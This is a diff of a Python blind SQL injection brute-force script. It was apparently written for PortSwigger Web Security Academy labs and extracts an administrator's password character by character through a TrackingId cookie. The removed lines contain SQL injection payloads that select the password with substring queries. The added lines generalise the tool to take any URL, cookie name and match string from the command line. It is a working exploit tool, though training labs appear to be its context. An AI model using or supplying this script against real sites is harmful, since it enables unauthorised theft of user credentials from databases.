@@ -3,14 +3,6 @@ import requests
 import argparse
 from colorama import Fore, Style
 
-'''
-    ' and (select substring(password, 1, 1) from users where username='administrator')='§a§'-- -
-    ' and substring((select password FROM users where username='administrator'), 1, 1)='a'-- -
-https://0a7a00690388c8a082c7ddf300dc000e.web-security-academy.net
-    /filter?category=Food+%26+Drink
-
-'''
-
 
 class BruteForce:
     __url = None
@@ -23,11 +15,6 @@ class BruteForce:
     __letter = None
     __amount = None
     __brrrrrrrrrr = None
-
-    __proxies = {
-        'http': 'http://127.0.0.1:8080',
-        'https': 'https://127.0.0.1:8080'
-    }
 
     def __init__(self, url, cookie, grep_match, amount):
         self.__url = url
@@ -47,7 +34,7 @@ class BruteForce:
 
     def get_cookies(self):
 
-        response = self.__session.get(self.__url)#proxies=self.__proxies, verify=False)
+        response = self.__session.get(self.__url)
 
         self.__cookies = self.__session.cookies.get_dict()
         return self.__session.cookies.get_dict()[self.__cookie]
@@ -57,7 +44,7 @@ class BruteForce:
 
     def make_request(self):
         self.__cookies[self.__cookie] += self.configure_payload()
-        response = requests.get(self.__url, cookies=self.__cookies)#, proxies=self.__proxies, verify=False)
+        response = requests.get(self.__url, cookies=self.__cookies)
         # print(Fore.RED, self.__cookies, Style.RESET_ALL)
         self.__cookies[self.__cookie] = self.get_cookies()
         if self.search_match(response.text):
@@ -73,8 +60,8 @@ class BruteForce:
         print(self.__payload_template % (69, 'dupa'))
 
     def brute_force(self):
-        tmpl = len(self.__brrrrrrrrrr)
         for i in range(self.__amount):
+            tmpl = len(self.__brrrrrrrrrr)
             self.__no_letter = i+1
             print(Fore.BLUE, f'[+] Found: {self.__brrrrrrrrrr}', Style.RESET_ALL)
             for j in range(48, 58):
@@ -102,10 +89,10 @@ class BruteForce:
 
 
 if __name__ == '__main__':
-    # parser = argparse.ArgumentParser(description='SQLi brute force script')
-    # # parser.add_argument('-')
-    # args = parser.parse_args()
-    bf = BruteForce('https://0ae4008b04029c0981b452010087005b.web-security-academy.net', 'TrackingId', 'Welcome back', 23)
-    # print(bf.get_cookies())
-    # bf.print_pt()
+    parser = argparse.ArgumentParser(description='SQLi brute force script.')
+    parser.add_argument('-u', '--url', type=str, nargs=1, help='Provide the url.')
+    parser.add_argument('-c', '--cookie', type=str, nargs=1, help='Provide cookie ID.')
+    parser.add_argument('-m', '--match', type=str, nargs=1, help='Provide match to be searched.')
+    args = parser.parse_args()
+    bf = BruteForce(args.url[0], args.cookie[0], args.match[0], 50)
     bf.run()
